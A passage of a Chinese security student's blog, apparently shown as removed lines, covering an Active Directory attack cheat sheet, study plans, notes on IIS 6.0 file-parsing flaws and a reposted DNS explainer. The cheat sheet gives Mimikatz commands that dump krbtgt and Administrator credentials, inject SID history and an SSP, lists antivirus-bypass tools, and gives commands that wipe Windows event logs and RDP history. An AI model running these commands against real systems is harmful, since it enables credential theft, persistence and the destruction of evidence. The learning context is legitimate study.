-<li><p>使用PowerShell Mimikatz</p>
-</li>
-<li><p>Mimikatz的DCSync</p>
-<ul>
-<li><p>使用Mimikatz的DCSync 远程转储Active Directory凭证</p>
-<ul>
-<li>提取 KRBTGT用户帐户的密码数据：Mimikatz “privilege::debug” “lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt”exit</li>
-<li>管理员用户帐户提取密码数据：Mimikatz “privilege::debug” “lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator” exit</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>NTDS.dit中提取哈希</p>
-<ul>
-<li>使用esedbexport恢复以后使用ntdsxtract提取</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>AD持久化</p>
-<ul>
-<li><p>活动目录持久性技巧</p>
-<ul>
-<li><a href="https://adsecurity.org/?p=1929" target="_blank" rel="noopener">https://adsecurity.org/?p=1929</a></li>
-<li>DS恢复模式密码维护</li>
-<li><p>DSRM密码同步</p>
-<ul>
-<li><p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。<br>KB961320<br><a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni</a></p>
-<ul>
-<li>巧用DSRM密码同步将域控权限持久化<br><a href="http://drops.xmd5.com/static/drops/tips-9297.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-9297.html</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>DCshadow</p>
-</li>
-</ul>
-</li>
-<li><p>Security Support Provider</p>
-<ul>
-<li><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>
-<ul>
-<li>privilege::debug<br>misc::memssp<br>这样就不需要重启<br>c:/windows/system32可看到新生成的文件kiwissp.log</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>SID历史</p>
-<ul>
-<li>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>mimikatz “privilege::debug” “misc::addsid bobafett ADSAdministrator”</p>
-<pre><code>- AdminSDHolder＆SDProp
-
-    - 利用AdminSDHolder＆SDProp（重新）获取域管理权限
-
-- 组策略
-
-    - https://adsecurity.org/?p=2716
-    - 策略对象在持久化及横向渗透中的应用
-
-- Hook PasswordChangeNotify
-
-    - http://wooyun.jozxing.cc/static/drops/tips-13079.html
-</code></pre><ul>
-<li><p>TIPS</p>
-<ul>
-<li>《域渗透——Dump Clear-Text Password after KB2871997 installed》</li>
-<li><p>《域渗透——Hook PasswordChangeNotify》</p>
-<ul>
-<li>可通过Hook PasswordChangeNotify实时记录域控管理员的新密码</li>
-</ul>
-</li>
-<li><p>《域渗透——Local Administrator Password Solution》</p>
-<ul>
-<li>域渗透时要记得留意域内主机的本地管理员账号</li>
-</ul>
-</li>
-<li><p>《域渗透——利用SYSVOL还原组策略中保存的密码》</p>
-</li>
-</ul>
-</li>
-<li><p>相关工具</p>
-<ul>
-<li>BloodHound</li>
-<li>CrackMapExec</li>
-<li><p>DeathStar</p>
-<ul>
-<li>利用过程：<a href="http://www.freebuf.com/sectool/160884.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/160884.html</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="在远程系统上执行程序"><a href="#在远程系统上执行程序" class="headerlink" title="在远程系统上执行程序"></a>在远程系统上执行程序</h3><ul>
-<li>At</li>
-<li>Psexec</li>
-<li>WMIC</li>
-<li>Wmiexec</li>
-<li>Smbexec</li>
-<li>Powershell remoting</li>
-<li>DCOM</li>
-</ul>
-<h3 id="IOT相关"><a href="#IOT相关" class="headerlink" title="IOT相关"></a>IOT相关</h3><ul>
-<li><p>1、路由器</p>
-<ul>
-<li>routersploit</li>
-</ul>
-</li>
-<li><p>2、打印机</p>
-<ul>
-<li>PRET</li>
-</ul>
-</li>
-<li><p>3、IOT exp</p>
-</li>
-<li><p>4、相关工具</p>
-<ul>
-<li>OWASP-Nettacker</li>
-<li>isf</li>
-<li>icsmaster]</li>
-</ul>
-</li>
-</ul>
-<h3 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h3><ul>
-<li>Cain</li>
-<li>Ettercap</li>
-<li>Responder</li>
-<li>MITMf</li>
-<li>Bettercap-ng</li>
-</ul>
-<h3 id="规避杀软及检测"><a href="#规避杀软及检测" class="headerlink" title="规避杀软及检测"></a>规避杀软及检测</h3><ul>
-<li><p>Bypass Applocker</p>
-<ul>
-<li>UltimateAppLockerByPassList</li>
-</ul>
-</li>
-<li><p>bypassAV</p>
-<ul>
-<li>Empire</li>
-<li>PEspin</li>
-<li>Shellter</li>
-<li>Ebowla</li>
-<li>Veil</li>
-<li>PowerShell</li>
-<li>Python</li>
-<li>代码注入技术Process Doppelgänging</li>
-</ul>
-</li>
-</ul>
-<h2 id="9、痕迹清理"><a href="#9、痕迹清理" class="headerlink" title="9、痕迹清理"></a>9、痕迹清理</h2><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a>Windows日志清除</h3><ul>
-<li>获取日志分类列表：</li>
-</ul>
-<p>wevtutil el &gt;1.txt<br>获取单个日志类别的统计信息：</p>
-<p>eg.</p>
-<p>wevtutil gli “windows powershell”<br>回显：</p>
-<p>creationTime: 2016-11-28T06:01:37.986Z<br>lastAccessTime: 2016-11-28T06:01:37.986Z<br>lastWriteTime: 2017-08-08T08:01:20.979Z<br>fileSize: 1118208<br>attributes: 32<br>numberOfLogRecords: 1228<br>oldestRecordNumber: 1<br>查看指定日志的具体内容：</p>
-<p>wevtutil qe /f:text “windows powershell”<br>删除单个日志类别的所有信息：</p>
-<p>wevtutil cl “windows powershell”</p>
-<h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><ul>
-<li><p>利用工具</p>
-<ul>
-<li>Invoke-Phant0m</li>
-<li>Windwos-EventLog-Bypass</li>
-</ul>
-</li>
-</ul>
-<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><ul>
-<li>run clearlogs</li>
-<li>clearev</li>
-</ul>
-<h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><ul>
-<li>@echo off<br>@reg delete “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default” /va /f<br>@del “%USERPROFILE%\My Documents\Default.rdp” /a<br>@exit</li>
-</ul>
-<p><em>XMind: ZEN - Trial Version</em><br>转自：<a href="https://0d4y.cc/" target="_blank" rel="noopener">https://0d4y.cc/</a></p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-2019年3月近期计划" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/01/2019年3月近期计划/">2019年3月近期计划</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/03/01/2019年3月近期计划/" class="article-date">
-  <time datetime="2019-02-28T17:02:30.000Z" itemprop="datePublished">2019-03-01</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/我想静静/">我想静静</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><ol>
-<li>区赛                   ★ ★ ★ ★ ★</li>
-<li>二级Python、Java      ★ ★ ★ ★</li>
-<li>博客                  ★ ★ ★</li>
-</ol>
-<h3 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h3><h4 id="1-区赛（20天）★-★-★-★-★"><a href="#1-区赛（20天）★-★-★-★-★" class="headerlink" title="1. 区赛（20天）★ ★ ★ ★ ★"></a>1. 区赛（20天）★ ★ ★ ★ ★</h4><ul>
-<li><p><strong>练靶场</strong><br>每天通一个，打的时候记住防御代码，总结笔记</p>
-<ol>
-<li>i春秋实验</li>
-<li>dvwa</li>
-<li>pikachu</li>
-<li>bwapp</li>
-<li>xsstv</li>
-<li>upload-libs</li>
-<li>sqli-libs</li>
-<li>i春秋综合渗透</li>
-<li>webug</li>
-<li>….</li>
-</ol>
-</li>
-<li><p><strong>练题目</strong></p>
-<ul>
-<li>看19年的题目要求</li>
-<li>练习17.18年区赛国赛题目</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-二级（30天）每天学习一个半小时★-★-★-★"><a href="#2-二级（30天）每天学习一个半小时★-★-★-★" class="headerlink" title="2. 二级（30天）每天学习一个半小时★ ★ ★ ★"></a>2. 二级（30天）每天学习一个半小时★ ★ ★ ★</h4><ul>
-<li>先看一小时视频，再练半小时代码，9点进行</li>
-<li>复习Java</li>
-</ul>
-<h4 id="3-每三天写一篇博客web漏洞相关★-★-★"><a href="#3-每三天写一篇博客web漏洞相关★-★-★" class="headerlink" title="3. 每三天写一篇博客web漏洞相关★ ★ ★"></a>3. 每三天写一篇博客web漏洞相关★ ★ ★</h4><ul>
-<li>每天最后的时间写</li>
-</ul>
-<h3 id="时间安排"><a href="#时间安排" class="headerlink" title="时间安排"></a>时间安排</h3><h4 id="工作日"><a href="#工作日" class="headerlink" title="工作日"></a>工作日</h4><ul>
-<li>中午1小时学习<br>ichunqiu在线视频web漏洞相关的<br>完成未完成的上课实验</li>
-</ul>
-<ul>
-<li>晚上7:00-9:00<br>打靶场</li>
-</ul>
-<ul>
-<li>晚上9:00-10:30<br>学Python</li>
-</ul>
-<h4 id="周末"><a href="#周末" class="headerlink" title="周末"></a>周末</h4><ul>
-<li>早上9:00-12:00<br>i春秋课程实验，总结笔记</li>
-</ul>
-<ul>
-<li>下午13：-18:00<br>春秋课程实验，总结笔记<br>每天一篇博客</li>
-</ul>
-<ul>
-<li>晚上7:00-10:30<br>其它时间：按工作日计划</li>
-</ul>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-2019年计划" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/01/2019年计划/">2019年个人计划</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/03/01/2019年计划/" class="article-date">
-  <time datetime="2019-02-28T16:02:47.000Z" itemprop="datePublished">2019-03-01</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/我想静静/">我想静静</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <h3 id="一、学习汇编、反汇编、C-C"><a href="#一、学习汇编、反汇编、C-C" class="headerlink" title="一、学习汇编、反汇编、C/C++"></a>一、学习汇编、反汇编、C/C++</h3><h3 id="二、去云南、丽江、大理、西双版纳"><a href="#二、去云南、丽江、大理、西双版纳" class="headerlink" title="二、去云南、丽江、大理、西双版纳"></a>二、去云南、丽江、大理、西双版纳</h3><h3 id="三、学习JavaEE、练习PHP和Python项目"><a href="#三、学习JavaEE、练习PHP和Python项目" class="headerlink" title="三、学习JavaEE、练习PHP和Python项目"></a>三、学习JavaEE、练习PHP和Python项目</h3><h3 id="四、买一套加菲猫套装"><a href="#四、买一套加菲猫套装" class="headerlink" title="四、买一套加菲猫套装"></a>四、买一套加菲猫套装</h3><h3 id="五、跑步减肥"><a href="#五、跑步减肥" class="headerlink" title="五、跑步减肥"></a>五、跑步减肥</h3><h3 id="六、看看能考什么证、NISP二级、计算机二级三级、软考、四级、教师资格证"><a href="#六、看看能考什么证、NISP二级、计算机二级三级、软考、四级、教师资格证" class="headerlink" title="六、看看能考什么证、NISP二级、计算机二级三级、软考、四级、教师资格证"></a>六、看看能考什么证、NISP二级、计算机二级三级、软考、四级、教师资格证</h3><h3 id="七、坚持写博客"><a href="#七、坚持写博客" class="headerlink" title="七、坚持写博客"></a>七、坚持写博客</h3><h3 id="八、早睡早起、保养皮肤"><a href="#八、早睡早起、保养皮肤" class="headerlink" title="八、早睡早起、保养皮肤"></a>八、早睡早起、保养皮肤</h3><h3 id="九、在补天SRC挖洞"><a href="#九、在补天SRC挖洞" class="headerlink" title="九、在补天SRC挖洞"></a>九、在补天SRC挖洞</h3><h3 id="十、追一个人。。。永不放弃喜欢，到同一个城市"><a href="#十、追一个人。。。永不放弃喜欢，到同一个城市" class="headerlink" title="十、追一个人。。。永不放弃喜欢，到同一个城市"></a>十、追一个人。。。永不放弃喜欢，到同一个城市</h3><h3 id=""><a href="#" class="headerlink" title=""></a><div class="highlight-box" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2019我要加倍成长，我的flag永远不倒。</span><br><span class="line">2019知识技能上的增加要是去年的两倍以上、学习效率要大大提高。</span><br><span class="line">2019要保持良好的身材，注重外在形象和个性。</span><br><span class="line">2019不忘初心、保持喜欢，多主动联系喜欢的人。</span><br><span class="line">2019不和别人说太多有用话、沉默是金，多学习其他人的优点和长处，保持谦虚低调。</span><br></pre></td></tr></table></figure></div></h3>
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-II6-0文件解析漏洞" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/25/II6-0文件解析漏洞/">II6.0文件解析漏洞</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/02/25/II6-0文件解析漏洞/" class="article-date">
-  <time datetime="2019-02-24T16:32:31.000Z" itemprop="datePublished">2019-02-25</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/中间件安全/">中间件安全</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <h3 id="可能被IIS当做asp程序执行的后缀有："><a href="#可能被IIS当做asp程序执行的后缀有：" class="headerlink" title="可能被IIS当做asp程序执行的后缀有："></a>可能被IIS当做asp程序执行的后缀有：</h3><blockquote>
-<p>.asp<br>.cer<br>.asa<br>.cdx</p>
-</blockquote>
-<h3 id="II6-0解析漏洞"><a href="#II6-0解析漏洞" class="headerlink" title="II6.0解析漏洞"></a>II6.0解析漏洞</h3><p>IIS 6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这一漏洞有两种完全不同的利用方式：</p>
-<h4 id="1-目录解析"><a href="#1-目录解析" class="headerlink" title="1.目录解析"></a>1.目录解析</h4><h4 id="形式：-www-xxx-com-xxx-asp-xxx-jpg"><a href="#形式：-www-xxx-com-xxx-asp-xxx-jpg" class="headerlink" title="形式： www.xxx.com/xxx.asp/xxx.jpg"></a>形式： <a href="http://www.xxx.com/xxx.asp/xxx.jpg" target="_blank" rel="noopener">www.xxx.com/xxx.asp/xxx.jpg</a></h4><p>第一种是新建一个名为“xxx.asp”的目录，该目录中的任何文件都被IIS当做asp程序执行（特殊符号是“/”）；</p>
-<h4 id="原理：服务器默认会把xxx-asp目录下的文件都解析成asp文件。"><a href="#原理：服务器默认会把xxx-asp目录下的文件都解析成asp文件。" class="headerlink" title="原理：服务器默认会把xxx.asp目录下的文件都解析成asp文件。"></a>原理：服务器默认会把xxx.asp目录下的文件都解析成asp文件。</h4><h3 id="2-文件解析"><a href="#2-文件解析" class="headerlink" title="2.文件解析"></a>2.文件解析</h3><h4 id="形式：-www-xxx-com-xxx-asp-jpg"><a href="#形式：-www-xxx-com-xxx-asp-jpg" class="headerlink" title="形式： www.xxx.com/xxx.asp;.jpg"></a>形式： <a href="http://www.xxx.com/xxx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xxx.asp;.jpg</a></h4><p>第二种是上传名为“xxx.asp;.jpg”的文件，虽然该文件真正的后缀名是“.jpg”，但由于含有特殊符号“;”，仍会被IIS当做asp程序执行。</p>
-<h4 id="原理：服务器默认不解析-号后面的内容，因此xxx-asp-jpg便被解析成asp文件了。"><a href="#原理：服务器默认不解析-号后面的内容，因此xxx-asp-jpg便被解析成asp文件了。" class="headerlink" title="原理：服务器默认不解析;号后面的内容，因此xxx.asp;jpg便被解析成asp文件了。"></a>原理：服务器默认不解析;号后面的内容，因此xxx.asp;jpg便被解析成asp文件了。</h4><p>IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“xxx.asp”，从而认为文件后缀为“.asp”。</p>
-<h3 id="遇到php时文件解析问题"><a href="#遇到php时文件解析问题" class="headerlink" title="遇到php时文件解析问题"></a>遇到php时文件解析问题</h3><p><a href="http://www.xxx.com/test.jpg/.php" target="_blank" rel="noopener">www.xxx.com/test.jpg/.php</a></p>
-<p>IIS和Nginx在这一点上是一样的，一看到URL中文件后缀是.php，便无论该文件是否存在，都直接交给php处理，而php又默认开启“cgi.fix_pathinfo”，会对文件路径进行“修理”，何谓“修理”？举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。</p>
-<p>若有文件test.jpg，访问时在其后加/.php，便可以让IIS把“test.jpg/.php”交给php，php“修理”文件路径“test.jpg/.php”得到“test.jpg”，该文件存在，便把该文件作为php程序执行了。</p>
-<h4 id="原理：IIS7-7-5在Fast-CGI运行模式下-在一个文件路径-xx-jpg-后面加上-xx-php会将-xx-jpg-xx-php-解析为-php-文件。"><a href="#原理：IIS7-7-5在Fast-CGI运行模式下-在一个文件路径-xx-jpg-后面加上-xx-php会将-xx-jpg-xx-php-解析为-php-文件。" class="headerlink" title="原理：IIS7/7.5在Fast-CGI运行模式下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。"></a>原理：IIS7/7.5在Fast-CGI运行模式下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。</h4><h2 id="利用方式：待更新2019年2月25日01-36-08"><a href="#利用方式：待更新2019年2月25日01-36-08" class="headerlink" title="利用方式：待更新2019年2月25日01:36:08"></a>利用方式：待更新2019年2月25日01:36:08</h2>
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-《百度白帽挖洞经验分享》笔记总结" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/24/《百度白帽挖洞经验分享》笔记总结/">《百度白帽挖洞经验分享》笔记</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/02/24/《百度白帽挖洞经验分享》笔记总结/" class="article-date">
-  <time datetime="2019-02-24T13:15:21.000Z" itemprop="datePublished">2019-02-24</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <h4 id="根据课程整理https-www-ichunqiu-com-course-59915"><a href="#根据课程整理https-www-ichunqiu-com-course-59915" class="headerlink" title="根据课程整理https://www.ichunqiu.com/course/59915"></a>根据课程整理<a href="https://www.ichunqiu.com/course/59915" target="_blank" rel="noopener">https://www.ichunqiu.com/course/59915</a></h4><h3 id="一-搜索引擎"><a href="#一-搜索引擎" class="headerlink" title="一 搜索引擎"></a>一 搜索引擎</h3><p><strong>Google 搜索语法</strong></p>
-<blockquote>
-<p>Site:baidu.com      指定域名是baidu.com的子域名<br>Inurl:url=http://指定检索出来的链接中含有”url=http://“</p>
-</blockquote>
-<h3 id="二-Burpsuite"><a href="#二-Burpsuite" class="headerlink" title="二 Burpsuite"></a>二 Burpsuite</h3><ol>
-<li>关注手机APP端或者微信公众号里面的一些网页（非mp.weixin.qq.com）</li>
-<li>手机和电脑处于同一个网络，手机设置代理后安装Burpsuite证书，然后开始愉快的抓包</li>
-<li>burpsuite插件Python Scripter，自己写python代码发送到远程扫描器gourdscan（github）</li>
-</ol>
-<h3 id="三-跨域"><a href="#三-跨域" class="headerlink" title="三 跨域"></a>三 跨域</h3><p><strong>OAUTH 方案</strong><br>寻找白名单域名js型URL跳转（通过refere泄露）<br><strong>JSONP方案</strong><br>通过javascript伪协议发送js请求（允许空REFERER）<br>通过白名单域的XSS来触发请求<br><strong>通过flash跨域</strong><br>在白名单域寻找JSONP接口（JSONP输出swf内容）<br><strong>Cors postmessage</strong></p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-DNS是什么？DNS域名系统解释" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/24/DNS是什么？DNS域名系统解释/">DNS是什么？DNS域名系统解释</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/02/24/DNS是什么？DNS域名系统解释/" class="article-date">
-  <time datetime="2019-02-24T10:23:08.000Z" itemprop="datePublished">2019-02-24</time>
-</a>
-    
-    
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/计算机网络/">计算机网络</a></li></ul>
-
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-doorframe" itemprop="articleBody">
-      
-        <h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS是域名系统的缩写，是网络环境中最常见但又被误解的组件之一。简而言之，DNS通过将域名与实际的Web服务器连接来帮助引导Internet上的流量。从本质上讲，它需要一个人性化的请求 – 像simcf.cc这样的域名 – 并将其转换为计算机友好的服务器IP地址 – 如121.11.0.232。</p>
-<p>由于DNS是关于查找地址和连接设备的，所以很多人称DNS为“互联网地址簿”。？如果没有DNS，你必须记住每个站点的IP地址才能访问它……好吧，那就行不通！</p>
-<h3 id="DNS如何工作？"><a href="#DNS如何工作？" class="headerlink" title="DNS如何工作？"></a>DNS如何工作？</h3><p>当用户在其Web浏览器中输入URL时，DNS可以将该URL连接到实际服务器的IP地址。这称为DNS名称解析，涉及DNS recursor查询各种名称服务器以确定服务器的实际IP地址。</p>
-<h3 id="DNS主要关注四个组件："><a href="#DNS主要关注四个组件：" class="headerlink" title="DNS主要关注四个组件："></a>DNS主要关注四个组件：</h3><p>域名注册商</p>
-<p>域名服务器</p>
-<p>DNS记录</p>
-<p>基于Web的服务（例如网站托管和电子邮件）</p>
-<p>我们来谈谈这四个组件以及它们如何协同工作。</p>
-<h3 id="域名注册商"><a href="#域名注册商" class="headerlink" title="域名注册商"></a>域名注册商</h3><p>域名注册商是购买域名和维护域名注册的服务提供商（例如GoDaddy或万网）。</p>
-<p>注册商是指定域名服务器的地方，大多数注册商都包括基本DNS服务和域名注册费用。因此，除非您向域添加自定义名称服务器，否则域将使用注册商的标准名称服务器。这意味着在绝大多数情况下，默认情况下，DNS记录由注册商管理。</p>
-<h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>域名服务器就像Web服务器一样。但是，它们配置为存储DNS记录，而不是提供网站或Web应用程序。</p>
-<p>这意味着当您要更改任何DNS记录时，您必须更改注册服务商或第三方服务（如万网）指定的名称服务器上的DNS记录。</p>
-<p>这个步骤通常有点混乱，所以让我们通过查看一个虚构的例子来打破这一点：</p>
-<p>您的域名（example.com）已在GoDaddy注册。</p>
-<p>您在GoDaddy帐户中向example.com添加Cloudflare的名称服务器以开始使用Cloudflare。</p>
-<p>您在GoDaddy更改example.com的DNS记录。此更改不会执行任何操作，因为域未使用GoDaddy的名称服务器。</p>
-<p>您在Cloudflare为example.com进行了相同的DNS更改。此更改将有效，因为该域使用Cloudflare的名称服务器。</p>
-<p>换句话说，如果您只使用GoDaddy，则需要使用GoDaddy更新DNS记录，因为它们控制着您的名称服务器。如果您使用的是Cloudflare，则需要使用Cloudflare更新DNS记录，因为它们可以控制您的名称服务器。</p>
-<h3 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h3><p>DNS记录将域与基于Web的服务相关联</p>
-<p>有几种不同类型的DNS记录，但在大多数情况下，只使用4种或5种类型的DNS记录：</p>
-<p>记录：用于将域或子域指向IPv4地址。这是用于将example.com这样的域指向example.com网站所在的Web服务器的规则。（注意：如果Web服务器使用的是IPv6地址而不是IPv4地址，则使用AAAA记录而不是A记录）。</p>
-<ol>
-<li><p>CNAME记录：用于将子域与主域或规范域相关联。此类规则通常用于将www子域与主域关联，例如<a href="http://www.example.com和example.com。" target="_blank" rel="noopener">www.example.com和example.com。</a></p>
-</li>
-<li><p>MX记录：用于将域与电子邮件服务相关联。如果您希望将example.com的邮件传递到特定的电子邮件服务（如Gmail），则会使用此规则。</p>
-</li>
-<li><p>TXT记录：用于将任意文本与域相关联。最常见的是，TXT记录用于将SPF记录与域相关联，以提高电子邮件的可传递性，并防止垃圾邮件发送者在发送垃圾邮件时滥用域名。查看我们关于电子邮件身份验证的深入博客文章及其重要性。</p>
-</li>
-</ol>
-<h3 id="网页服务"><a href="#网页服务" class="headerlink" title="网页服务"></a>网页服务</h3><p>在我们的例子中，Web服务是网站托管。必须将A记录（或AAAA记录）添加到域的名称服务器，以将该域与托管该网站的Web服务器相关联。</p>
-<p>还有许多其他类型的Web服务通过DNS记录与域相关联：电子邮件，SFTP，托管控制面板，Webmail应用程序和phpMyAdmin，仅举几例。</p>
-<h3 id="DNS传播"><a href="#DNS传播" class="headerlink" title="DNS传播"></a>DNS传播</h3><p>当您更改给定域的DNS时 – 例如更新DNS记录或切换名称服务器 – 这些更改需要一些时间才能生效，这个时间称为传播。</p>
-<p>从一种情况到下一种情况，传播差异很大。</p>
-<p>在DNS记录的情况下，每个记录具有相关的生存时间（TTL）值，此值确定DNS记录更改生效的速度。</p>
-<p>在大多数情况下，DNS记录的TTL默认设置为1或4小时。这意味着大多数时候DNS更改将需要4个小时才能生效。更高的TTL值也是可能的，并且意味着当更新DNS记录时，在更改完全生效之前将花费更多时间。在某些极端情况下，有些人的TTL值可能高达一周。</p>
-<p>对于名称服务器，注册商确定TTL值，通常无法更改。这意味着当您切换到新的名称服务器时，这些更改可能需要几分钟到一天或更长时间才能生效。</p>
-<h3 id="DNS配置-–-如何设置域"><a href="#DNS配置-–-如何设置域" class="headerlink" title="DNS配置 – 如何设置域"></a>DNS配置 – 如何设置域</h3><p>您通常可以通过两种方式设置DNS，一种方法是通过您的域名注册商简单地将您的域名服务器指向您的主机名称服务器。这些是至少两个单独的URL，看起来像这样（你可以有两个以上的URL，只是不少）：</p>
-<p>ns1.yourhost.com</p>
-<p>ns2.yourhost.com</p>
-<h3 id="免费DNS与高级DNS"><a href="#免费DNS与高级DNS" class="headerlink" title="免费DNS与高级DNS"></a>免费DNS与高级DNS</h3><p>您可以找到免费的DNS和高级DNS，一般而言，我们认为高端DNS是当今世界的必需品。</p>
-<p>选择优质DNS的一个重要原因是速度和可靠性，查找DNS记录和引导流量需要时间，即使只是几毫秒。</p>
-<p>通常，您从域名注册商处获得的免费DNS相对较慢，而优质DNS通常可提供更好的性能。</p>
-<p>此外，高级DNS可以提供​​更好的安全性和可用性，尤其是当您受到DDoS攻击时。</p>
-<h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>希望您现在更了解DNS的工作原理。回顾一下，DNS用于将基于Web的服务（例如网站托管和电子邮件）与域名相关联。这涉及四个步骤：</p>
-<p>域名必须在域名注册商处注册。</p>
-<p>名称服务器必须由域名注册商指定。</p>
-<p>必须将DNS记录添加到域名注册商或第三方服务（如Cloudflare）指定的名称服务器中。</p>
-<p>必须完全传播DNS记录以将域与每个相关的Web服务相关联。</p>
-<h5 id="转载自-一个专注SEO-SEM网络营销推广教程的自媒体-DNS是什么？DNS域名系统解释-https-www-simcf-cc-3468-html"><a href="#转载自-一个专注SEO-SEM网络营销推广教程的自媒体-DNS是什么？DNS域名系统解释-https-www-simcf-cc-3468-html" class="headerlink" title="转载自: 一个专注SEO/SEM网络营销推广教程的自媒体 - DNS是什么？DNS域名系统解释 (https://www.simcf.cc/3468.html)"></a>转载自: 一个专注SEO/SEM网络营销推广教程的自媒体 - DNS是什么？DNS域名系统解释 (<a href="https://www.simcf.cc/3468.html" target="_blank" rel="noopener">https://www.simcf.cc/3468.html</a>)</h5>
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
-    <article id="post-腾讯云搭建Web漏洞靶场" class="article global-container article-type-post" itemscope="" itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
